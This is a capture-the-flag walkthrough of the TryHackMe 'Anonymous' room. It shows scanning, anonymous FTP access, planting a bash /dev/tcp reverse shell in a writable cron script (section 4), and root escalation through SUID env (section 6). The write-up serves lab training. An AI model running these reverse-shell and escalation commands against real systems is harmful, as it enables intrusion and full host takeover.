# Anonymous Room Walkthrough

Link: [TryHackMe Anonymous Room](https://tryhackme.com/r/room/anonymous)

---

## 1. Scanning Ports

First, let's scan the ports using `Rustscan` and `Nmap`:

```bash
rustscan --ulimit 5000 -a 10.10.104.130
```

Let's use `rustscan` to get all the open ports quickly.

Next, use `Nmap` to gather more information about the open ports:

```bash
nmap -A -p 21,22,139,445 10.10.104.130
```

![Screenshot 2025-01-18 182927](https://github.com/user-attachments/assets/2cac72dc-587c-4330-908d-9973618f4c16)

From the scan results, we find that the FTP port allows anonymous login.

---

## 2. Logging into FTP

We log in using the following credentials:

- **Username**: `anonymous`
- **Password**: `anonymous`

Successful login confirms access to the FTP server. Let's enumerate the directory:

```bash
ls
```

We find a directory named `scripts`. Navigate into it:

```bash
cd scripts
ls
```

Inside, we discover three files, including a shell script with full access:

```bash
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
```

---

## 3. Downloading Files

To inspect the files, download all of them using the following command:

```bash
mget *
```

![Screenshot 2025-01-18 184254](https://github.com/user-attachments/assets/7e9160ed-b0ce-4c72-a1cd-f5376868046d)

The files are downloaded to your terminal's working directory.

After reviewing the files, the `clean.sh` script is identified as significant. It schedules periodic cleaning tasks. This presents an opportunity to exploit it with a reverse shell.

![Screenshot 2025-01-18 185223](https://github.com/user-attachments/assets/fbca5f47-9f77-4937-adb0-82f56b42b718)

![Screenshot 2025-01-18 185106](https://github.com/user-attachments/assets/3ca94d02-55ba-47c7-bf07-5e166e584bb7)

---

## 4. Reverse Shell Exploitation

Search online for a one-liner reverse shell. Here’s an example:

```bash
bash -i >& /dev/tcp/10.17.55.14/7788 0>&1
```

Replace `10.17.55.14` with your IP address and `7788` with your preferred port number.

Modify the `clean.sh` file to include the reverse shell command:

```bash
nano clean.sh
```

Update the script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.17.55.14/7788 0>&1
```

Save the changes and re-upload the file to the FTP server:

```bash
put clean.sh
```

![Screenshot 2025-01-18 190548](https://github.com/user-attachments/assets/ea2ff980-d89c-40d0-b432-33b05e03d5a8)

![Screenshot 2025-01-18 191446](https://github.com/user-attachments/assets/b7e26c71-bc44-41da-ace3-1b58fe68081a)

---

## 5. Listening for Reverse Shell

Start a listener on your terminal to catch the reverse shell:

```bash
nc -lvnp 7788
```

Within a minute, a connection is established, giving access to the target system.


![Screenshot 2025-01-18 191511](https://github.com/user-attachments/assets/af35f0af-b477-48d3-9e90-c9470ab09145)

---

## 6. Privilege Escalation

### Upgrading Shell

First, upgrade the shell for better usability:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

### Finding SUID Files

Search for SUID files on the system:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

![Screenshot 2025-01-19 180053](https://github.com/user-attachments/assets/68de0ae0-153d-404f-9a98-efc2751f8c88)

From the results, we find that `/usr/bin/env` has the SUID bit set.

### Exploiting SUID Vulnerability

Referencing [GTFOBins](https://gtfobins.github.io/), we discover a vulnerability in `env` that allows us to escalate privileges. Execute the following command:

```bash
/usr/bin/env /bin/sh -p
```

![Screenshot 2025-01-19 180308](https://github.com/user-attachments/assets/bfde2dc2-4f56-4ca7-9e7d-74d77ecbbaa2)

This grants root access.

![Screenshot 2025-01-19 180544](https://github.com/user-attachments/assets/fe381a58-3f1d-45d2-b081-5657ab7d5ff6)

---


**Enjoy :) !!**

